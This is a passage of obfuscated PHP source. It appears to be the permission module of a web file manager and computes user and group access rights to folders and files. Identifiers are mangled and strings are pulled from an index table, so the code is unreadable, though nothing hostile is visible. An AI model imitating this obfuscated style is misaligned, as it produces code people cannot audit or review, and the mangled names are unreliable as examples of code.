{ $ÉşŸºÔ = !0; break; } } } if ($ÉşŸºÔ) { $²½¶ÁÏê[] = $Ğ­Á°˜Ï; } $’¨¡Şã = $Ğ­Á°˜Ï[$®ÉÂÓ×Û[402]]; if (isset($á®µí¨ä[$’¨¡Şã])) { $Ğ­Á°˜Ï[$®ÉÂÓ×Û[2043]][] = $á®µí¨ä[$’¨¡Şã][0]; $á®µí¨ä[$’¨¡Şã] = !1; } } $á®µí¨ä = array_filter(array_values($á®µí¨ä)); $²½¶ÁÏê = array_merge($á®µí¨ä, $²½¶ÁÏê); return $²½¶ÁÏê; } public function setAllChildrenByUser($ø½çÈò©, $Õç½íÔê, $ÄÕÒºÈô) { $¿’‡Éğî =& $_SERVER[óó‹¸‚å]; $Ú¡½¯û¥ = $this->getAllChildrenByUser($ø½çÈò©, $Õç½íÔê); if (!$ÄÕÒºÈô || !$Ú¡½¯û¥) { return !1; } foreach ($Ú¡½¯û¥ as $øöí›ÕĞ) { $™ßâ€…Ú = array(); foreach ($øöí›ÕĞ[$¿’‡Éğî[2043]] as $­äÄ¶÷ã) { $ó¿³å”² = $­äÄ¶÷ã[$¿’‡Éğî[467]]; $ôÛÁ‡ëˆ = $­äÄ¶÷ã[$¿’‡Éğî[1674]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $ÀÉáıö¹ = $­äÄ¶÷ã[$¿’‡Éğî[1674]] ? $­äÄ¶÷ã[$¿’‡Éğî[1674]] : $­äÄ¶÷ã[$¿’‡Éğî[1863]]; if ($­äÄ¶÷ã[$¿’‡Éğî[1674]] && $­äÄ¶÷ã[$¿’‡Éğî[1674]] == $Õç½íÔê) { continue; } $™ßâ€…Ú[] = array($¿’‡Éğî[402] => $øöí›ÕĞ[$¿’‡Éğî[402]], $¿’‡Éğî[411] => $ôÛÁ‡ëˆ, $¿’‡Éğî[505] => intval($ÀÉáıö¹), $¿’‡Éğî[1967] => isset($ó¿³å”²[$¿’‡Éğî[399]]) ? intval($ó¿³å”²[$¿’‡Éğî[399]]) : 0, $¿’‡Éğî[2023] => isset($ó¿³å”²[$¿’‡Éğî[2023]]) ? intval($ó¿³å”²[$¿’‡Éğî[2023]]) : -1); } $™ßâ€…Ú[] = array($¿’‡Éğî[402] => $øöí›ÕĞ[$¿’‡Éğî[402]], $¿’‡Éğî[411] => SourceModel::TYPE_USER, $¿’‡Éğî[505] => intval($Õç½íÔê), $¿’‡Éğî[1967] => intval($ÄÕÒºÈô), $¿’‡Éğî[2023] => -1); $this->where(array($¿’‡Éğî[417] => $øöí›ÕĞ[$¿’‡Éğî[402]]))->delete(); $this->addAll($™ßâ€…Ú); } return !0; } public function get($›´ËœŞì) { $ÙÄ¯¤ú¨ = $this->getSourceList(array($›´ËœŞì), !0); return $ÙÄ¯¤ú¨[0]; } public function getSourceList($›ûÃË”, $†Ôöİ—¯ = false, $º—êƒõ = false) { $ÍÊ¸Û¨ƒ =& $_SERVER[óó‹¸‚å]; if (!$›ûÃË”) { return array(); } $×Ğ©ª¡¥ = Model($ÍÊ¸Û¨ƒ[1343]); if (!$†Ôöİ—¯ && count($›ûÃË”) == 1) { $†Ôöİ—¯ = array(); $†Ôöİ—¯[$›ûÃË”[0]] = $×Ğ©ª¡¥->sourceInfo($›ûÃË”[0]); } if (!$†Ôöİ—¯) { $Öáİù¾× = array($ÍÊ¸Û¨ƒ[417] => array($ÍÊ¸Û¨ƒ[418], $›ûÃË”)); $†Ôöİ—¯ = $×Ğ©ª¡¥->field($ÍÊ¸Û¨ƒ[2047])->where($Öáİù¾×)->select(); $†Ôöİ—¯ = array_to_keyvalue($†Ôöİ—¯, $ÍÊ¸Û¨ƒ[402]); } $ÚÃÂÉ”’ = $›ûÃË”; foreach ($†Ôöİ—¯ as $…©½ûµ¡ => $À¶ÑÃ) { $éèù×¡¹ = $×Ğ©ª¡¥->parentLevelArray($À¶ÑÃ[$ÍÊ¸Û¨ƒ[521]]); $ÚÃÂÉ”’ = array_merge($ÚÃÂÉ”’, array($…©½ûµ¡), array_reverse($éèù×¡¹)); } $ÚÃÂÉ”’ = array_values(array_unique($ÚÃÂÉ”’)); if (!$ÚÃÂÉ”’) { return array(); } $à§ÂŠõ = $this->sourceAuthSelect($ÚÃÂÉ”’); $öááÂñÀ = array(); foreach ($ÚÃÂÉ”’ as $ô•„¯ƒÌ) { if (isset($à§ÂŠõ[$ô•„¯ƒÌ])) { $öááÂñÀ[$ô•„¯ƒÌ] = $à§ÂŠõ[$ô•„¯ƒÌ]; } } $Ïöà¬Ëà = $this->userIsRoot($º—êƒõ); $Ö€ç»¦ = AuthModel::authAll(); $Ì Î‚¸« = array($ÍÊ¸Û¨ƒ[414] => $Ö€ç»¦, $ÍÊ¸Û¨ƒ[2048] => array($ÍÊ¸Û¨ƒ[419] => 0, $ÍÊ¸Û¨ƒ[1869] => $Ö€ç»¦, $ÍÊ¸Û¨ƒ[420] => LNG($ÍÊ¸Û¨ƒ[2049]), $ÍÊ¸Û¨ƒ[1886] => $ÍÊ¸Û¨ƒ[2050])); $­ç¦ëÃÏ = array(); foreach ($†Ôöİ—¯ as $ô•„¯ƒÌ => $½ü¤Èó³) { if ($Ïöà¬Ëà && $GLOBALS[$ÍÊ¸Û¨ƒ[6]][$ÍÊ¸Û¨ƒ[1882]]) { $­ç¦ëÃÏ[$ô•„¯ƒÌ] = $Ì Î‚¸«; continue; } $­ç¦ëÃÏ[$ô•„¯ƒÌ] = $this->makeSourceAuth($½ü¤Èó³, $öááÂñÀ, $º—êƒõ); } return $­ç¦ëÃÏ; } public function authDeepCheck($õı’™öß, $´¾ûÂØƒ = false) { $¬‹ƒ™Á =& $_SERVER[óó‹¸‚å]; $´¾ûÂØƒ = $´¾ûÂØƒ ? $´¾ûÂØƒ : USER_ID; $İ†‚å¿¥ = $this->makeAuthDeep($´¾ûÂØƒ); if (!in_array($õı’™öß, $İ†‚å¿¥[$¬‹ƒ™Á[2051]])) { return !1; } $ÛØÉŞÌª = array(); foreach ($İ†‚å¿¥[$¬‹ƒ™Á[2052]] as $²û—ëåø => $¯©ï‡Áğ) { if (!in_array($õı’™öß, $¯©ï‡Áğ)) { continue; } $ÛØÉŞÌª[] = $²û—ëåø; } if (!$ÛØÉŞÌª) { return !1; } $Ä‰ìíõ = $ÛØÉŞÌª ? $ÛØÉŞÌª[0] : $õı’™öß; return array($¬‹ƒ™Á[414] => -1, $¬‹ƒ™Á[467] => array($¬‹ƒ™Á[419] => $¬‹ƒ™Á[1196], $¬‹ƒ™Á[1869] => $¬‹ƒ™Á[197], $¬‹ƒ™Á[420] => LNG($¬‹ƒ™Á[2053]), $¬‹ƒ™Á[1886] => $¬‹ƒ™Á[2054]), $¬‹ƒ™Á[2055] => LNG($¬‹ƒ™Á[2056]), $¬‹ƒ™Á[2057] => $this->sourceAuthInfo($Ä‰ìíõ)); } protected function makeAuthDeep($Ô¤ßÕûÊ = false) { $ãÉÓ„“ =& $_SERVER[óó‹¸‚å]; static $Æğ§Ü†† = array(); $Ô¤ßÕûÊ = $Ô¤ßÕûÊ ? $Ô¤ßÕûÊ : USER_ID; if (isset($Æğ§Ü††[$Ô¤ßÕûÊ])) { return $Æğ§Ü††[$Ô¤ßÕûÊ]; } $¥Ó¼ã•ª = Model($ãÉÓ„“[2058])->listData(); $±´äÉ—Ï = array(); foreach ($¥Ó¼ã•ª as $„¿Û¹‹ ) { if ($„¿Û¹‹ [$ãÉÓ„“[413]] == 0 && $„¿Û¹‹ [$ãÉÓ„“[1885]] == $ãÉÓ„“[88]) { $±´äÉ—Ï[] = $„¿Û¹‹ [$ãÉÓ„“[399]]; } } $ë¾ÁÄ©« = $this->userGroupParents($Ô¤ßÕûÊ); $×ŒßÄŒ› = array($ãÉÓ„“[411] => SourceModel::TYPE_USER, $ãÉÓ„“[505] => $Ô¤ßÕûÊ); if ($ë¾ÁÄ©«) { $×ŒßÄŒ› = array(array($ãÉÓ„“[411] => SourceModel::TYPE_USER, $ãÉÓ„“[505] => $Ô¤ßÕûÊ), array($ãÉÓ„“[411] => SourceModel::TYPE_GROUP, $ãÉÓ„“[505] => array($ãÉÓ„“[418], $ë¾ÁÄ©«)), $ãÉÓ„“[1007] => $ãÉÓ„“[1961]); } $—í«æØ = $this->field($ãÉÓ„“[2059])->where($×ŒßÄŒ›)->select(); $ˆ¸‘¨Ï€ = array(); $ŸÏ™Ô³ä = array_to_keyvalue_group($—í«æØ, $ãÉÓ„“[402]); foreach ($ŸÏ™Ô³ä as $¦Ü£áî¨ => $ÚÀ´ƒµˆ) { $é©ß“¸– = $this->authArrayCheck($ÚÀ´ƒµˆ, $Ô¤ßÕûÊ); if ($é©ß“¸–[$ãÉÓ„“[414]] > 0) { $ˆ¸‘¨Ï€[] = $¦Ü£áî¨ . $ãÉÓ„“[12]; } } if ($ë¾ÁÄ©«) { $áı¶À = Model($ãÉÓ„“[522]); foreach ($ë¾ÁÄ©« as $Ÿ¢Ò…©•) { $œº’“ÕÃ = $áı¶À->getInfo($Ÿ¢Ò…©•); if (!$œº’“ÕÃ || !is_array($œº’“ÕÃ[$ãÉÓ„“[86]])) { continue; } $ˆ¸‘¨Ï€[] = $œº’“ÕÃ[$ãÉÓ„“[86]][$ãÉÓ„“[402]]; } } $ûë§’òÑ = array(); $µ¹Û™í¶ = $ë¾ÁÄ©«; $õàÔ¥À¦ = Model($ãÉÓ„“[1343]); $áı¶À = Model($ãÉÓ„“[522]); $‘¦Í‘ëæ = array(); $”Üå¤ë€ = array(); $®ñ¸ğÄä = array(); $ò×ë–¿ı = array(); if ($ˆ¸‘¨Ï€) { $¼ÓÍ¢Ç = $õàÔ¥À¦->where(array($ãÉÓ„“[402] => array($ãÉÓ„“[418], $ˆ¸‘¨Ï€)))->select(); foreach ($¼ÓÍ¢Ç as $¨¡àÂ…†) { $…¿¹úó = $õàÔ¥À¦->parentLevelArray($¨¡àÂ…†[$ãÉÓ„“[521]]); $ûë§’òÑ = array_merge($ûë§’òÑ, $…¿¹úó); $µ¹Û™í¶[] = $¨¡àÂ…†[$ãÉÓ„“[505]]; $‘¦Í‘ëæ[$¨¡àÂ…†[$ãÉÓ„“[402]]] = $…¿¹úó; $”Üå¤ë€[$¨¡àÂ…†[$ãÉÓ„“[402]]] = $¨¡àÂ…†[$ãÉÓ„“[505]]; } } $µ¹Û™í¶ = array_values(array_unique($µ¹Û™í¶)); $¹§Ğ§”Œ = $µ¹Û™í¶; foreach ($¹§Ğ§”Œ as $Ÿ¢Ò…©•) { $œº’“ÕÃ = $áı¶À->getInfo($Ÿ¢Ò…©•); $…¿¹úó = $õàÔ¥À¦->parentLevelArray($œº’“ÕÃ[$ãÉÓ„“[521]]); $µ¹Û™í¶ = array_merge($µ¹Û™í¶, $…¿¹úó); } $µ¹Û™í¶ = array_values(array_unique($µ¹Û™í¶)); foreach ($µ¹Û™í¶ as $Ÿ¢Ò…©•) { $œº’“ÕÃ = $áı¶À->getInfo($Ÿ¢Ò…©•); $ûë§’òÑ[] = $œº’“ÕÃ[$ãÉÓ„“[86]][$ãÉÓ„“[402]]; $®ñ¸ğÄä[$Ÿ¢Ò…©•] = $œº’“ÕÃ[$ãÉÓ„“[86]][$ãÉÓ„“[402]]; $ò×ë–¿ı[$Ÿ¢Ò…©•] = $õàÔ¥À¦->parentLevelArray($œº’“ÕÃ[$ãÉÓ„“[521]]); } foreach ($‘¦Í‘ëæ as $ù²¹ÙŠÍ => $Ş ®¸Úò) { $æÔ‘ÉÆá = $”Üå¤ë€[$ù²¹ÙŠÍ]; if (!$æÔ‘ÉÆá || !$®ñ¸ğÄä[$æÔ‘ÉÆá]) { continue; } $–âüä…… = array(); foreach ($ò×ë–¿ı[$æÔ‘ÉÆá] as $Ÿ¢Ò…©•) { $–âüä……[] = $®ñ¸ğÄä[$Ÿ¢Ò…©•]; } $‘¦Í‘ëæ[$ù²¹ÙŠÍ] = array_merge($–âüä……, $Ş ®¸Úò); } $ûë§’òÑ = array_values(array_unique($ûë§’òÑ)); $®í¥â“ = array($ãÉÓ„“[2051] => $ûë§’òÑ, $ãÉÓ„“[2052] => $‘¦Í‘ëæ); $Æğ§Ü††[$Ô¤ßÕûÊ] = $®í¥â“; return $®í¥â“; } private function makeSourceAuth($§ì¥×üç, $²ÆºŸı«, $€üµµİ = false) { $×ùÜ×¢µ =& $_SERVER[óó‹¸‚å]; $åóîÈÙş = $×ùÜ×¢µ[88]; $éÙ²ä = $§ì¥×üç[$×ùÜ×¢µ[505]]; $ ü·¥ = $§ì¥×üç[$×ùÜ×¢µ[411]] == SourceModel::TYPE_GROUP; $ÎÃÈ•Ÿ = $ ü·¥ ? $this->groupRootAuth($éÙ²ä, $€üµµİ) : !1; if ($ÎÃÈ•Ÿ && Model($×ùÜ×¢µ[507])->authCheckAction($ÎÃÈ•Ÿ[$×ùÜ×¢µ[413]], $×ùÜ×¢µ[1884])) { return $this->groupAuthInfo($ÎÃÈ•Ÿ, $éÙ²ä); } $Öïß— = Model($×ùÜ×¢µ[1343])->parentLevelArray($§ì¥×üç[$×ùÜ×¢µ[521]]); $Öïß— = array_merge(array($§ì¥×üç[$×ùÜ×¢µ[402]]), array_reverse($Öïß—)); $°¢ÆÄ¶„ = !1; foreach ($Öïß— as $Ä”…Ö™™) { if (!isset($²ÆºŸı«[$Ä”…Ö™™])) { continue; } $üñÙ·Ï = $this->authMake($²ÆºŸı«[$Ä”…Ö™™], $€üµµİ); if ($üñÙ·Ï[$×ùÜ×¢µ[467]]) { $°¢ÆÄ¶„ = $üñÙ·Ï; break; } } if (!$ ü·¥) { return $°¢ÆÄ¶„; } if (!$°¢ÆÄ¶„ && $ÎÃÈ•Ÿ) { $°¢ÆÄ¶„ = $this->groupAuthInfo($ÎÃÈ•Ÿ, $éÙ²ä); } if (!$°¢ÆÄ¶„) { $êÆê³½Ã = Model($×ùÜ×¢µ[522])->getInfo($éÙ²ä); $¡¼Šè›Š = explode($×ùÜ×¢µ[50], trim($êÆê³½Ã[$×ùÜ×¢µ[521]], $×ùÜ×¢µ[50])); $¡¼Šè›Š = array_reverse($¡¼Šè›Š); foreach ($¡¼Šè›Š as $ÜƒÒ€Ë) { if ($ÜƒÒ€Ë == $×ùÜ×¢µ[197] || $ÜƒÒ€Ë == $åóîÈÙş) { continue; } $‹ñ¤Àù« = $this->groupRootAuth($ÜƒÒ€Ë, $€üµµİ); if (!$‹ñ¤Àù«) { continue; } $°¢ÆÄ¶„ = $this->groupAuthInfo($‹ñ¤Àù«, $ÜƒÒ€Ë); break; } } if (!$°¢ÆÄ¶„ || $°¢ÆÄ¶„[$×ùÜ×¢µ[414]] <= 0) { $ŒÃ³œ«¡ = $this->authDeepCheck($§ì¥×üç[$×ùÜ×¢µ[402]], $€üµµİ); if ($ŒÃ³œ«¡) { $°¢ÆÄ¶„ = $ŒÃ³œ«¡; } } return $°¢ÆÄ¶„; } private function userIsRoot($Ü¯Ÿ’ºã = false) { $”Ê§á¥ =& $_SERVER[óó‹¸‚å]; if (!$Ü¯Ÿ’ºã && _get($GLOBALS, $”Ê§á¥[503])) { return !0; } $¯Êƒ’´Ÿ = Model($”Ê§á¥[535])->getInfo($Ü¯Ÿ’ºã); $°ˆ½Ûä“ = Model($”Ê§á¥[2060])->listData($¯Êƒ’´Ÿ[$”Ê§á¥[1555]]); if ($°ˆ½Ûä“ && $°ˆ½Ûä“[$”Ê§á¥[511]][$”Ê§á¥[2061]] == 1) { return !0; } return !1; } private function sourceAuthInfo($ÄòÜéš‰) { $¬Õ¯ãí´ =& $_SERVER[óó‹¸‚å]; $Äøµ‡â = Model($¬Õ¯ãí´[1343]); $›†•‡Ş = $Äøµ‡â->sourceInfo($ÄòÜéš‰); if (!$›†•‡Ş) { return !1; } $Äøµ‡â->groupPathDisplay($›†•‡Ş); $Ëå¢Ã× = array($›†•‡Ş); $Ëå¢Ã× = $Äøµ‡â->_listAppendPath($Ëå¢Ã×); $›†•‡Ş = $Ëå¢Ã×[0]; $Ã¼°¨¹ = $›†•‡Ş[$¬Õ¯ãí´[519]]; if (isset($›†•‡Ş[$¬Õ¯ãí´[527]])) { $ €¸Øê¸ = explode($¬Õ¯ãí´[8], trim($›†•‡Ş[$¬Õ¯ãí´[519]], $¬Õ¯ãí´[8])); array_shift($ €¸Øê¸); $Ã¼°¨¹ = $›†•‡Ş[$¬Õ¯ãí´[525]] . $¬Õ¯ãí´[2062] . implode($¬Õ¯ãí´[8], $ €¸Øê¸); } return array($¬Õ¯ãí´[420] => $›†•‡Ş[$¬Õ¯ãí´[32]], $¬Õ¯ãí´[84] => KodIO::make($›†•‡Ş[$¬Õ¯ãí´[402]]), $¬Õ¯ãí´[2063] => $Ã¼°¨¹); } private function groupAuthInfo($ã†Öö‰Ã, $İòæŠ) { $Ï«ëôÃ’ =& $_SERVER[óó‹¸‚å]; $±Ç¯ô—Ò = Model($Ï«ëôÃ’[522])->getInfo($İòæŠ); return array($Ï«ëôÃ’[2064] => intval($ã†Öö‰Ã[$Ï«ëôÃ’[413]]), $Ï«ëôÃ’[2048] => $ã†Öö‰Ã, $Ï«ëôÃ’[2065] => LNG($Ï«ëôÃ’[2066]), $Ï«ëôÃ’[2057] => array($Ï«ëôÃ’[420] => $±Ç¯ô—Ò[$Ï«ëôÃ’[32]], $Ï«ëôÃ’[84] => KodIO::make($±Ç¯ô—Ò[$Ï«ëôÃ’[86]][$Ï«ëôÃ’[402]]), $Ï«ëôÃ’[2063] => $±Ç¯ô—Ò[$Ï«ëôÃ’[526]])); } protected function groupRootAuth($Ö™š»Îí, $Ü¶˜á÷Ñ = false) { $·Ş’ƒ·â =& $_SERVER[óó‹¸‚å]; $Ü¶˜á÷Ñ = $Ü¶˜á÷Ñ ? $Ü¶˜á÷Ñ : USER_ID; $†çƒĞĞ¸ = $Ü¶˜á÷Ñ . $·Ş’ƒ·â[2067] . $Ö™š»Îí; static $£´æÌ• = array(); if (isset($£´æÌ•[$†çƒĞĞ¸])) { return $£´æÌ•[$†çƒĞĞ¸]; } $×Á•ßĞ = Model($·Ş’ƒ·â[522])->getInfo($Ö™š»Îí); $Ã­õ‘îÃ = $this->userGroupList($Ü¶˜á÷Ñ); $ŸÂãÄ¯ = isset($Ã­õ‘îÃ[$Ö™š»Îí]) ? $Ã­õ‘îÃ[$Ö™š»Îí][$·Ş’ƒ·â[413]] : !1; if ($ŸÂãÄ¯ && Model($·Ş’ƒ·â[507])->authCheckAction($ŸÂãÄ¯[$·Ş’ƒ·â[413]], $·Ş’ƒ·â[1884])) { $£´æÌ•[$†çƒĞĞ¸] = $ŸÂãÄ¯; return $ŸÂãÄ¯; } $ÃÈŒ¶Ï÷ = $this->sourceAuthSelect($×Á•ßĞ[$·Ş’ƒ·â[86]][$·Ş’ƒ·â[402]]); $ÃœÖµŞÙ = $ÃÈŒ¶Ï÷ ? $this->authMake($ÃÈŒ¶Ï÷, $Ü¶˜á÷Ñ) : !1; $Î¹Ïİı„ = $ÃœÖµŞÙ ? $ÃœÖµŞÙ[$·Ş’ƒ·â[467]] : !1; $£´æÌ•[$†çƒĞĞ¸] = $Î¹Ïİı„ ? $Î¹Ïİı„ : $ŸÂãÄ¯; return $£´æÌ•[$†çƒĞĞ¸]; } public function authOwnerApply($•ğÉ©Åµ) { $­Ãß˜ˆ· =& $_SERVER[óó‹¸‚å]; if (empty($•ğÉ©Åµ[$­Ãß˜ˆ·[413]]) || isset($•ğÉ©Åµ[$­Ãß˜ˆ·[2068]]) && $•ğÉ©Åµ[$­Ãß˜ˆ·[2068]]) { return $•ğÉ©Åµ; } if (AuthModel::authCheckRoot($•ğÉ©Åµ[$­Ãß˜ˆ·[413]][$­Ãß˜ˆ·[414]])) { return $•ğÉ©Åµ; } $»¯ôÃ³‹ = Model($­Ãß˜ˆ·[1343])->parentLevelArray($•ğÉ©Åµ[$­Ãß˜ˆ·[521]]); $»¯ôÃ³‹ = array_merge(array($•ğÉ©Åµ[$­Ãß˜ˆ·[402]]), array_reverse($»¯ôÃ³‹)); $ÓÖ´øÅ¹ = $this->sourceAuthSelect($»¯ôÃ³‹); $¬èÍİ¶µ = array(); $´˜ö½–Ğ = array(); foreach ($ÓÖ´øÅ¹ as $ğ–Øß¾ => $è·‚šãı) { $÷ÚíÜ°÷ = $this->authFolderOwnerUser($è·‚šãı); $¬èÍİ¶µ[$ğ–Øß¾] = $÷ÚíÜ°÷; $´˜ö½–Ğ = array_merge($´˜ö½–Ğ, $÷ÚíÜ°÷[$­Ãß˜ˆ·[600]]); if ($÷ÚíÜ°÷[$­Ãß˜ˆ·[2069]]) { break; } } if (count($´˜ö½–Ğ) == 0) { $´˜ö½–Ğ = $this->authFolderOwnerGroup($•ğÉ©Åµ[$­Ãß˜ˆ·[505]]); } $´˜ö½–Ğ = array_unique($´˜ö½–Ğ); if (AuthModel::authCheckRoot($•ğÉ©Åµ[$­Ãß˜ˆ·[413]][$­Ãß˜ˆ·[414]])) { $´˜ö½–Ğ[] = USER_ID; } $•ğÉ©Åµ[$­Ãß˜ˆ·[413]][$­Ãß˜ˆ·[2070]] = Model($­Ãß˜ˆ·[513])->userListInfo($´˜ö½–Ğ); return $•ğÉ©Åµ; } private function authFolderOwnerGroup($Ú€–¥øé) { $©·Ó¸Üª =& $_SERVER[óó‹¸‚å]; $ó‘›´¡Å = Model($©·Ó¸Üª[1953])->where(array($©·Ó¸Üª[1863] => $Ú€–¥øé))->select(); $ğÈù­Ç´ = array(); if (!$ó‘›´¡Å) { return $ğÈù­Ç´; } foreach ($ó‘›´¡Å as $Ï·Ö«µ) { $åªü£Û× = $this->authInfo($Ï·Ö«µ); if (AuthModel::authCheckRoot($åªü£Û×[$©·Ó¸Üª[413]])) { $ğÈù­Ç´[] = $Ï·Ö«µ[$©·Ó¸Üª[1674]]; } } return $ğÈù­Ç´; } private function authFolderOwnerUser($¹ÂóÊº÷) { $ØîÍ€™ƒ =& $_SERVER[óó‹¸‚å]; $Öã‡³ßî = array(); $¯˜š¦ò‚ = !1; foreach ($¹ÂóÊº÷ as $úåŸÁÒ) { $×Ë©áà  = $this->authInfo($úåŸÁÒ); if ($úåŸÁÒ[$ØîÍ€™ƒ[505]] == $ØîÍ€™ƒ[197]) { $¯˜š¦ò‚ = !0; } if ($úåŸÁÒ[$ØîÍ€™ƒ[411]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($×Ë©áà [$ØîÍ€™ƒ[413]])) { $Öã‡³ßî[] = $úåŸÁÒ[$ØîÍ€™ƒ[505]]; } } } return array($ØîÍ€™ƒ[600] => $Öã‡³ßî, $ØîÍ€™ƒ[2069] => $¯˜š¦ò‚); } public function authMake($”œÖÒ›Ê, $‹âûªÓ = false) { $´º‘ëç =& $_SERVER[óó‹¸‚å]; $ñ¥•ÆÌî = $this->authArrayCheck($”œÖÒ›Ê, $‹âûªÓ); if ($ñ¥•ÆÌî[$´º‘ëç[2071]]) { $ñ¥•ÆÌî[$´º‘ëç[2071]] = $this->sourceAuthInfo($ñ¥•ÆÌî[$´º‘ëç[2071]]); } return $ñ¥•ÆÌî; } public function authArrayCheck($üÜîÆàõ, $ğƒëÍÑÊ = false) { $–Ó½Òö =& $_SERVER[óó‹¸‚å]; if (!$üÜîÆàõ) { return array($–Ó½Òö[414] => 0, $–Ó½Òö[467] => !1); } $ğƒëÍÑÊ = $ğƒëÍÑÊ ? $ğƒëÍÑÊ : USER_ID; $êúÏÑ§Î = 0; $¾ÉÆÙ¬˜ = 0; $âĞÇ¶à® = 0; $‘üÎàù¹ = 0; $ òÊãà = 0; $ŠšÅë = 0; $Á¨ıÂí• = 1000; $íŒ…¯ªÁ = 0; $ª«Ş«§Â = 0; $Ğ»À¶¤¨ = 0; $àˆ»÷Ê¿ = 0; $ Ÿ°Áˆ = array($–Ó½Òö[402] => 0); foreach ($üÜîÆàõ as $ Ÿ°Áˆ) { $ƒóí Œë = $this->authInfo($ Ÿ°Áˆ); if (!$ƒóí Œë) { continue; } $êˆ”¡¯æ = $ Ÿ°Áˆ[$–Ó½Òö[505]]; $¿â£­Ò¾ = intval($ƒóí Œë[$–Ó½Òö[413]]); if ($ Ÿ°Áˆ[$–Ó½Òö[411]] == SourceModel::TYPE_USER && $êˆ”¡¯æ == $ğƒëÍÑÊ) { $êúÏÑ§Î = !0; $âĞÇ¶à® = $ƒóí Œë; $¾ÉÆÙ¬˜ = $¿â£­Ò¾; } else { if ($ Ÿ°Áˆ[$–Ó½Òö[411]] == SourceModel::TYPE_GROUP && $this->groupContainUser($êˆ”¡¯æ, $ğƒëÍÑÊ)) { $‘üÎàù¹ = !0; $İ´£ØëÄ = $this->groupStepToUserGroup($êˆ”¡¯æ, $ğƒëÍÑÊ); if ($İ´£ØëÄ < $Á¨ıÂí•) { $Á¨ıÂí• = $İ´£ØëÄ; $ òÊãà = $¿â£­Ò¾; $ŠšÅë = $ƒóí Œë; $íŒ…¯ªÁ = $êˆ”¡¯æ; } if ($İ´£ØëÄ == $Á¨ıÂí• && $¿â£­Ò¾ >= $ òÊãà) { $ òÊãà = $¿â£­Ò¾; $ŠšÅë = $ƒóí Œë; $íŒ…¯ªÁ = $êˆ”¡¯æ; } } else { if ($êˆ”¡¯æ == $–Ó½Òö[197]) { $ª«Ş«§Â = !0; $àˆ»÷Ê¿ = $ƒóí Œë; $Ğ»À¶¤¨ = $¿â£­Ò¾; } } } } if ($êúÏÑ§Î) { $ö…·£œ§ = $¾ÉÆÙ¬˜; $ƒóí Œë = $âĞÇ¶à®; $©—¿Á–Ó = LNG($–Ó½Òö[2072]); } else { if ($‘üÎàù¹) { $ö…·£œ§ = $ òÊãà; $ƒóí Œë = $ŠšÅë; $ùá“Ş„ñ = Model($–Ó½Òö[522])->getInfo($íŒ…¯ªÁ); $©—¿Á–Ó = $–Ó½Òö[162] . $ùá“Ş„ñ[$–Ó½Òö[526]] . $–Ó½Òö[2073] . LNG($–Ó½Òö[2074]); } else { if ($ª«Ş«§Â) { $ö…·£œ§ = $Ğ»À¶¤¨; $ƒóí Œë = $àˆ»÷Ê¿; $©—¿Á–Ó = LNG($–Ó½Òö[2045]); } else { $ö…·£œ§ = 0; $ƒóí Œë = !1; $©—¿Á–Ó = $–Ó½Òö[12]; } } } $˜ºäñŒÙ = array($–Ó½Òö[2064] => intval($ö…·£œ§), $–Ó½Òö[2048] => $ƒóí Œë, $–Ó½Òö[2065] => $©—¿Á–Ó, $–Ó½Òö[2057] => $ Ÿ°Áˆ[$–Ó½Òö[402]]); return $˜ºäñŒÙ; } private function groupContainUser($ÀåÄ»À, $˜›¿´òŒ = false) { return in_array($ÀåÄ»À, $this->userGroupParents($˜›¿´òŒ)); } private function groupStepToUserGroup($é¢âûôœ, $Œ—î” = false) { $ûé¾Šà¦ =& $_SERVER[óó‹¸‚å]; $ßÔ¼…Ú’ = $this->userGroupList($Œ—î”); $Ô©Áçˆ = 1000; $Å™¦  — = $GLOBALS[$ûé¾Šà¦[6]][$ûé¾Šà¦[89]][$ûé¾Šà¦[1966]] == 1; $­àÈ®“— = $Å™¦  — ? 3 : 2; foreach ($ßÔ¼…Ú’ as $ù¾Å²æû) { if ($ù¾Å²æû[$ûé¾Šà¦[1863]] == $é¢âûôœ) { return 0; } $ŸÅçÁœö = explode($ûé¾Šà¦[50], trim($ù¾Å²æû[$ûé¾Šà¦[521]], $ûé¾Šà¦[50])); if ($ŸÅçÁœö[0] == $ûé¾Šà¦[197] && count($ŸÅçÁœö) > $­àÈ®“—) { $¢Ÿ÷¼ª = array_reverse(array_slice($ŸÅçÁœö, $­àÈ®“—)); $ßÉıÙ§¶ = array_search($é¢âûôœ, $¢Ÿ÷¼ª); if ($ßÉıÙ§¶ !== !1 && $ßÉıÙ§¶ + 1 <= $Ô©Áçˆ) { $Ô©Áçˆ = $ßÉıÙ§¶ + 1; } } } return $Ô©Áçˆ; } private function userGroupList($‹Å½‘€ = false) { $…®Úå =& $_SERVER[óó‹¸‚å]; static $¶ãÒ”öË = array(); if (isset($¶ãÒ”öË[$‹Å½‘€])) { return $¶ãÒ”öË[$‹Å½‘€]; } $öá³±• = Model($…®Úå[535])->getInfo($‹Å½‘€); $¶ãÒ”öË[$‹Å½‘€] = array_to_keyvalue($öá³±•[$…®Úå[2046]], $…®Úå[1863]); return $¶ãÒ”öË[$‹Å½‘€]; } public function userGroupParents($¶ĞÓÚ­±) { $”•’’Ê½ =& $_SERVER[óó‹¸‚å]; static $Ç°“Á¬÷ = array(); $¶ĞÓÚ­± = $¶ĞÓÚ­± ? $¶ĞÓÚ­± : USER_ID; if (isset($Ç°“Á¬÷[$¶ĞÓÚ­±])) { return $Ç°“Á¬÷[$¶ĞÓÚ­±]; } $£“‘À˜… = $this->userGroupList($¶ĞÓÚ­±); $ô†­ˆïõ = array(); $ß¦¹ë¿Û = $GLOBALS[$”•’’Ê½[6]][$”•’’Ê½[89]][$”•’’Ê½[1966]] == 1; $¾¼óË = $ß¦¹ë¿Û ? 3 : 2; foreach ($£“‘À˜… as $ÉÎÎ·ÏÎ) { $¦ ¹¤Æô = array($ÉÎÎ·ÏÎ[$”•’’Ê½[1863]]); $±·´³·È = explode($”•’’Ê½[50], trim($ÉÎÎ·ÏÎ[$”•’’Ê½[521]], $”•’’Ê½[50])); if ($±·´³·È[0] == $”•’’Ê½[197] && count($±·´³·È) > $¾¼óË) { $î˜« ‰ = array_slice($±·´³·È, $¾¼óË); $¦ ¹¤Æô = array_merge($¦ ¹¤Æô, array_reverse($î˜« ‰)); } $ô†­ˆïõ = array_merge($ô†­ˆïõ, $¦ ¹¤Æô); } $Ç°“Á¬÷[$¶ĞÓÚ­±] = array_unique($ô†­ˆïõ); return $Ç°“Á¬÷[$¶ĞÓÚ­±]; } public function 